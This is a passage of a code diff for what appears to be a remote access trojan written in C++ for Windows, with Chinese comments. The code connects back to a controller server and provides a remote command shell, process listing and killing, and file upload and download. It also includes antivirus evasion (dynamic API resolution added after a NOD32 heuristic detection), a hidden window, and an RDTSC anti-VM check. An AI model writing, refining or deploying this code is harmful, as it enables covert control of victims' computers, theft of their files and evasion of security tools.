-        	    ProcessList(chBuffer, &msgHead);
-        	}
-        	break;
-        	case CMD_PROCESSKILL:
-        	{
-        	    ProcessKill(chBuffer, &msgHead);
-        	}
-        	break;
-        	default:
-        	{
-        	    msgHead.dwCmd = CMD_INVALID;
-        	    msgHead.dwSize = 0;
-        	}
-        	break;
-        }
+		switch (msgHead.dwCmd)	//解析命令
+		{
+			case CMD_PROCESSLIST:
+			{
+				ProcessList(chBuffer, &msgHead);
+			}
+			break;
+			case CMD_PROCESSKILL:
+			{
+				ProcessKill(chBuffer, &msgHead);
+			}
+			break;
+			default:
+			{
+				msgHead.dwCmd = CMD_INVALID;
+				msgHead.dwSize = 0;
+			}
+			break;
+		}
 
-        if (!SendMsg(ProcessSocket, chBuffer, &msgHead))	//发送数据
-            break;
-    }
+		if (!SendMsg(ProcessSocket, chBuffer, &msgHead))	//发送数据
+			break;
+	}
 
 	shutdown(ProcessSocket,0);
-    closesocket(ProcessSocket);
-    return 0;
+	closesocket(ProcessSocket);
+	return 0;
 }
 //////////////////////////////////////////////////////////////////////////////////
 //远程shell线程
 DWORD _stdcall ShellThread(LPVOID lParam)
 {
-    struct sockaddr_in LocalAddr;
-    LocalAddr.sin_family=AF_INET;
-    LocalAddr.sin_port=htons(modify_data.ServerPort);
-    LocalAddr.sin_addr.S_un.S_addr=resolve(modify_data.ServerAddr);
+	SOCKET ShellSocket = ConnectServer();
+	if (ShellSocket == SOCKET_ERROR)
+	{
+		return 0;
+	}
 
-    SOCKET ShellSocket = socket(AF_INET, SOCK_STREAM, 0);
-    if (connect(ShellSocket,(PSOCKADDR)&LocalAddr,sizeof(LocalAddr)) == SOCKET_ERROR)
-    {
-    	shutdown(ShellSocket,0);
-        closesocket(ShellSocket);
-        return 0;//connect error
-    }
+	MsgHead msgHead;
+	char *chBuffer = new char[512 * 1024]; //数据交换区 512KB
 
-    //====================================================================
-    MsgHead msgHead;
-    char *chBuffer = new char[512 * 1024]; //数据交换区 512KB
-
-    //send socket type
-    msgHead.dwCmd = SOCKET_CMDSHELL;
-    msgHead.dwSize = 0;
-    if (!SendMsg(ShellSocket, chBuffer, &msgHead))
-    {
+	//send socket type
+	msgHead.dwCmd = SOCKET_CMDSHELL;
+	msgHead.dwSize = 0;
+	if (!SendMsg(ShellSocket, chBuffer, &msgHead))
+	{
 		shutdown(ShellSocket,0x02);
-        closesocket(ShellSocket);
-        return 0;//send socket type error
-    }
+		closesocket(ShellSocket);
+		return 0;//send socket type error
+	}
 
-    while (1)	//接收命令
-    {        
-        if (!RecvMsg(ShellSocket, chBuffer, &msgHead))
-            break;
+	while (1)	//接收命令
+	{        
+		if (!RecvMsg(ShellSocket, chBuffer, &msgHead))
+			break;
 
-        switch (msgHead.dwCmd)	//解析命令
-        {
-        case CMD_SHELLRUN:
+		switch (msgHead.dwCmd)	//解析命令
+		{
+		case CMD_SHELLRUN:
 			{
 				DOSShell(chBuffer, &msgHead);
 			}
 			break;
-        default:
-            break;
+		default:
+			break;
 		}
-		        
-        if (!SendMsg(ShellSocket, chBuffer, &msgHead))	//发送数据
-            break;
-    }
+				
+		if (!SendMsg(ShellSocket, chBuffer, &msgHead))	//发送数据
+			break;
+	}
 
-    if (chBuffer != NULL)
-        delete[] chBuffer;
+	if (chBuffer != NULL)
+		delete[] chBuffer;
 	
 	shutdown(ShellSocket,0);
-    closesocket(ShellSocket);
-    return 0;
+	closesocket(ShellSocket);
+	return 0;
 }
 
 //////////////////////////////////////////////////////////////////////////////////
 //文件上传下载
 DWORD _stdcall FileDownThread(LPVOID lParam)
 {
-    FileOpt m_FileOpt;
-    memcpy(&m_FileOpt,(FileOpt*)lParam,sizeof(FileOpt));
+	FileOpt m_FileOpt;
+	memcpy(&m_FileOpt,(FileOpt*)lParam,sizeof(FileOpt));
 
-    struct sockaddr_in LocalAddr;
-    LocalAddr.sin_family=AF_INET;
-    LocalAddr.sin_port=htons(modify_data.ServerPort);
-    LocalAddr.sin_addr.S_un.S_addr=resolve(modify_data.ServerAddr);
+	SOCKET FileSocket = ConnectServer();
+	if (FileSocket == SOCKET_ERROR)
+	{
+		return 0;
+	}
 
-    SOCKET FileSocket = socket(AF_INET, SOCK_STREAM, 0);
-    if (connect(FileSocket,(PSOCKADDR)&LocalAddr,sizeof(LocalAddr)) == SOCKET_ERROR)
-    {
-    	shutdown(FileSocket,0x02);
-        closesocket(FileSocket);
-        return 0;//connect error
-    }
+	MsgHead msgHead;
+	msgHead.dwCmd = SOCKET_FILEDOWN;
+	msgHead.dwSize = 0;
+	if (!SendMsg(FileSocket, NULL, &msgHead))
+	{
+		shutdown(FileSocket,0);
+		closesocket(FileSocket);
+		return 0;//send socket type error
+	}
 
-    MsgHead msgHead;
-    //send socket type
-    msgHead.dwCmd = SOCKET_FILEDOWN;
-    msgHead.dwSize = 0;
-    if (!SendMsg(FileSocket, NULL, &msgHead))
-    {
-    	shutdown(FileSocket,0);
-        closesocket(FileSocket);
-        return 0;//send socket type error
-    }
+	//////////////////////////////////////////////////////
+	HANDLE hDownFile = INVALID_HANDLE_VALUE;
+	DWORD  dwDownFileSize = 0, dwBytes;
+	BYTE   SendBuffer[4096];
+	int nRet =0 ;
 
-    //////////////////////////////////////////////////////
-    HANDLE hDownFile = INVALID_HANDLE_VALUE;
-    DWORD  dwDownFileSize = 0, dwBytes;
-    BYTE   SendBuffer[4096];
-    int nRet =0 ;
+	//get download data
+	hDownFile = CreateFile(m_FileOpt.cScrFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
+	if (hDownFile == INVALID_HANDLE_VALUE)//CMD_READFILEEOR
+		dwDownFileSize  = 0;
+	else
+		dwDownFileSize = GetFileSize(hDownFile, NULL);
 
-    //get download data
-    hDownFile = CreateFile(m_FileOpt.cScrFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
-    if (hDownFile == INVALID_HANDLE_VALUE)//CMD_READFILEEOR
-        dwDownFileSize  = 0;
-    else
-        dwDownFileSize = GetFileSize(hDownFile, NULL);
+	m_FileOpt.iSize = dwDownFileSize;
+	//send file message
+	if (send(FileSocket, (char *)&m_FileOpt, sizeof(FileOpt), 0) <=0 || dwDownFileSize <= 0)
+	{
+		shutdown(FileSocket,0x02);
+		closesocket(FileSocket);
+		return 1;//send socket type error
+	}
+	//被NOD32启发杀了
+	HINSTANCE hInst = LoadLibraryW(L"kernel32.dll");
+	if (hInst == NULL)
+	{
+		closesocket(FileSocket);
+		return 0;//send socket type error
+	}
+	typedef BOOL (WINAPI *pReadFile)(
+		HANDLE hFile,
+		LPVOID lpBuffer,
+		DWORD nNumberOfBytesToRead,
+		LPDWORD lpNumberOfBytesRead,
+		LPOVERLAPPED lpOverlapped
+	);
+	pReadFile MyReadFile = (pReadFile)GetProcAddress(hInst, "ReadFileA");
 
-    m_FileOpt.iSize = dwDownFileSize;
-    //send file message
-    if (send(FileSocket, (char *)&m_FileOpt, sizeof(FileOpt), 0) <=0 || dwDownFileSize <= 0)
-    {
-        shutdown(FileSocket,0x02);
-        closesocket(FileSocket);
-        return 1;//send socket type error
-    }
-    //被NOD32启发杀了
-    HINSTANCE hInst = LoadLibraryW(L"kernel32.dll");
-    if (hInst == NULL)
-    {
-        closesocket(FileSocket);
-        return 0;//send socket type error
-    }
-    typedef BOOL (WINAPI *pReadFile)(
-        HANDLE hFile,
-        LPVOID lpBuffer,
-        DWORD nNumberOfBytesToRead,
-        LPDWORD lpNumberOfBytesRead,
-        LPOVERLAPPED lpOverlapped
-    );
-    pReadFile MyReadFile = (pReadFile)GetProcAddress(hInst, "ReadFileA");
-
-    //循环发送文件数据
-    while (dwDownFileSize > 0)
-    {
-        if (MyReadFile)
-        {
-            if ( !MyReadFile(hDownFile, SendBuffer, 4096, &dwBytes, NULL) )
-                break;
-        }
-        else if ( !ReadFile(hDownFile, SendBuffer, 4096, &dwBytes, NULL) )
+	//循环发送文件数据
+	while (dwDownFileSize > 0)
+	{
+		if (MyReadFile)
+		{
+			if ( !MyReadFile(hDownFile, SendBuffer, 4096, &dwBytes, NULL) )
+				break;
+		}
+		else if ( !ReadFile(hDownFile, SendBuffer, 4096, &dwBytes, NULL) )
 		{
 			break;
-        }
+		}
 
-        if ( send(FileSocket, (char*)&SendBuffer, dwBytes, 0) <= 0 )
-            break;
-        dwDownFileSize -= dwBytes;
+		if ( send(FileSocket, (char*)&SendBuffer, dwBytes, 0) <= 0 )
+			break;
+		dwDownFileSize -= dwBytes;
 
-    }
-    if (hInst)
-        FreeLibrary(hInst);
-        
-    CloseHandle(hDownFile);
-    shutdown(FileSocket, 0x02);
-    closesocket(FileSocket);
+	}
+	if (hInst)
+		FreeLibrary(hInst);
+		
+	CloseHandle(hDownFile);
+	shutdown(FileSocket, 0x02);
+	closesocket(FileSocket);
 
-    return 10;
+	return 10;
 }
 
 DWORD _stdcall FileUpThread(LPVOID lParam)
 {
-    FileOpt m_FileOpt;
-    memcpy(&m_FileOpt,(FileOpt*)lParam,sizeof(FileOpt));
+	FileOpt m_FileOpt;
+	memcpy(&m_FileOpt,(FileOpt*)lParam,sizeof(FileOpt));
 
-    struct sockaddr_in LocalAddr;
-    LocalAddr.sin_family=AF_INET;
-    LocalAddr.sin_port=htons(modify_data.ServerPort);
-    LocalAddr.sin_addr.S_un.S_addr=resolve(modify_data.ServerAddr);
+	SOCKET FileSocket = ConnectServer();
+	if (FileSocket == SOCKET_ERROR)
+	{
+		return 0;
+	}
 
-    SOCKET FileSocket = socket(AF_INET, SOCK_STREAM, 0);
-    if (connect(FileSocket,(PSOCKADDR)&LocalAddr,sizeof(LocalAddr)) == SOCKET_ERROR)
-    {
-    	shutdown(FileSocket,0);
-        closesocket(FileSocket);
-        return 0;//connect error
-    }
+	int iOutTime = 60000;//60秒超时
+	setsockopt(FileSocket, SOL_SOCKET, SO_RCVTIMEO, (char*)&iOutTime, sizeof(int));
 
-    int iOutTime = 60000;//60秒超时
-    setsockopt(FileSocket, SOL_SOCKET, SO_RCVTIMEO, (char*)&iOutTime, sizeof(int));
+	MsgHead msgHead;
+	//send socket type
+	msgHead.dwCmd = SOCKET_FILEUP;
+	msgHead.dwSize = 0;
+	if (!SendMsg(FileSocket, NULL, &msgHead))
+	{
+		shutdown(FileSocket,0);
+		closesocket(FileSocket);
+		return 0;//send socket type error
+	}
 
-    MsgHead msgHead;
-    //send socket type
-    msgHead.dwCmd = SOCKET_FILEUP;
-    msgHead.dwSize = 0;
-    if (!SendMsg(FileSocket, NULL, &msgHead))
-    {
-    	shutdown(FileSocket,0);
-        closesocket(FileSocket);
-        return 0;//send socket type error
-    }
+	//////////////////////////////////////////////////////
+	HANDLE hUpFile = INVALID_HANDLE_VALUE;
+	DWORD  dwUpFileSize = 0, dwBufSize = 4096, dwBytes;
+	BYTE   RecvBuffer[4096];
+	int nRet =0 ;
 
-    //////////////////////////////////////////////////////
-    HANDLE hUpFile = INVALID_HANDLE_VALUE;
-    DWORD  dwUpFileSize = 0, dwBufSize = 4096, dwBytes;
-    BYTE   RecvBuffer[4096];
-    int nRet =0 ;
+	//get download data
+	hUpFile = CreateFile(m_FileOpt.cScrFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
+	if (hUpFile == INVALID_HANDLE_VALUE)//CMD_READFILEEOR
+		dwUpFileSize  = 0;
+	else
+		dwUpFileSize = 100;
 
-    //get download data
-    hUpFile = CreateFile(m_FileOpt.cScrFile, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
-    if (hUpFile == INVALID_HANDLE_VALUE)//CMD_READFILEEOR
-        dwUpFileSize  = 0;
-    else
-        dwUpFileSize = 100;
+	m_FileOpt.iSize = dwUpFileSize;
+	//send file message
+	if (send(FileSocket, (char *)&m_FileOpt, sizeof(FileOpt), 0) <=0 || dwUpFileSize <= 0)
+	{
+		shutdown(FileSocket,0x02);
+		closesocket(FileSocket);
+		return 1;//send socket type error
+	}
 
-    m_FileOpt.iSize = dwUpFileSize;
-    //send file message
-    if (send(FileSocket, (char *)&m_FileOpt, sizeof(FileOpt), 0) <=0 || dwUpFileSize <= 0)
-    {
-        shutdown(FileSocket,0x02);
-        closesocket(FileSocket);
-        return 1;//send socket type error
-    }
+	while (TRUE)
+	{
+		nRet = recv(FileSocket, (char*)&RecvBuffer, dwBufSize, 0);
+		if (nRet <= 0)
+			break;
+		WriteFile(hUpFile, RecvBuffer, nRet, &dwBytes, NULL);
+	}
 
-    while (TRUE)
-    {
-        nRet = recv(FileSocket, (char*)&RecvBuffer, dwBufSize, 0);
-        if (nRet <= 0)
-            break;
-        WriteFile(hUpFile, RecvBuffer, nRet, &dwBytes, NULL);
-    }
+	CloseHandle(hUpFile);
+	shutdown(FileSocket,0x02);
+	closesocket(FileSocket);
 
-    CloseHandle(hUpFile);
-    shutdown(FileSocket,0x02);
-    closesocket(FileSocket);
-
-    return 10;
+	return 10;
 }
 
 LONG _stdcall Errdo(_EXCEPTION_POINTERS *ExceptionInfo)
@@ -979,22 +930,44 @@ LONG _stdcall Errdo(_EXCEPTION_POINTERS *ExceptionInfo)
 }
 
 
-extern "C" __declspec(dllexport) DWORD WINAPI RoutineMain(LPVOID lp)
+DWORD WINAPI RoutineMain(LPVOID lp)
 {
 	//TCHAR MyPath[MAX_PATH*2];
-	//GetModuleFileName(htempModule, MyPath, sizeof(MyPath));	
+	//GetModuleFileName(hModule, MyPath, sizeof(MyPath));	
 	//CreateFile(MyPath, GENERIC_READ, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
-	modify_data.ServerPort = 80;
-	lstrcpy(modify_data.ServerAddr, "127.0.0.1");	//192.168.1.145
+	if(lp != NULL)
+	{
+		memcpy(&modify_data, lp, sizeof(MODIFY_DATA));
+	}
+	else
+	{
+		modify_data.ServerPort = 80;
+		lstrcpy(modify_data.ServerAddr, "127.0.0.1");	//192.168.1.145
+	}
 	
+	int state = 1;
+
 	while (1)
-    {
-    	__try
-    	{
-			ConnectThread(NULL);
+	{
+		__try
+		{
+			state = ConnectThread(NULL);
 		}
 		__except(1){}
+
+		if (state == 0) //Connect Error
+		{
+			Sleep(30 * 1000);
+		} 
+		else if (state == 1) //Network Error
+		{
+			Sleep(10 * 1000);
+		}
+		else if (state == -1) //Exit
+		{
+			return -1;
+		}
 
 		Sleep(1000);
 	}
@@ -1003,30 +976,32 @@ extern "C" __declspec(dllexport) DWORD WINAPI RoutineMain(LPVOID lp)
 }
 
 #ifndef DLLBUILD
+//#pragma comment(linker,"/ENTRY:WinMain")
+
 int WINAPI WinMain(HINSTANCE hInstance,
-                   HINSTANCE hPrevInstance,
-                   LPSTR     lpCmdLine,
-                   int       nCmdShow)
+				   HINSTANCE hPrevInstance,
+				   LPSTR     lpCmdLine,
+				   int       nCmdShow)
 {
 #ifdef LxScreem
 	OpenUserDesktop();
 #endif
 
 #ifdef Lxform
-    HWND hwnd = CreateWindowExW(
-    			   WS_EX_APPWINDOW,
-                   L"#32770",
-                   L"WindowsNet",
-                   WS_OVERLAPPEDWINDOW,
-                   0,
-                   0,
-                   100,
-                   100,
-                   HWND_DESKTOP,
-                   NULL,
-                   hInstance,
-                   NULL
-               );
+	HWND hwnd = CreateWindowExW(
+				   WS_EX_APPWINDOW,
+				   L"#32770",
+				   L"WindowsNet",
+				   WS_OVERLAPPEDWINDOW,
+				   0,
+				   0,
+				   100,
+				   100,
+				   HWND_DESKTOP,
+				   NULL,
+				   hInstance,
+				   NULL
+			   );
 
 	ShowWindow(hwnd, SW_HIDE);
 	UpdateWindow(hwnd);
@@ -1034,17 +1009,17 @@ int WINAPI WinMain(HINSTANCE hInstance,
 
 #ifdef LxVM
 	_asm
-    {
-        RDTSC
-        xchg    ecx, eax
-        RDTSC
-        sub     eax, ecx
-        cmp     eax, 0FFh
+	{
+		RDTSC
+		xchg    ecx, eax
+		RDTSC
+		sub     eax, ecx
+		cmp     eax, 0FFh
 		jl      OK
-        xor     eax, eax
-        push    eax
-        call    ExitProcess
-    }
+		xor     eax, eax
+		push    eax
+		call    ExitProcess
+	}
 OK:
 #endif
 
@@ -1057,9 +1032,9 @@ OK:
 
 	RoutineMain(0);
 
-    WSACleanup();
+	WSACleanup();
 
-    return 0;
+	return 0;
 }
 
 #else
@@ -1069,7 +1044,6 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReser
 	if(ul_reason_for_call == DLL_PROCESS_ATTACH)
 	{
 		DisableThreadLibraryCalls(hModule);
-
 		//CloseHandle(CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RoutineMain, NULL, 0, NULL));
 	}
 	else if(ul_reason_for_call == DLL_PROCESS_DETACH)
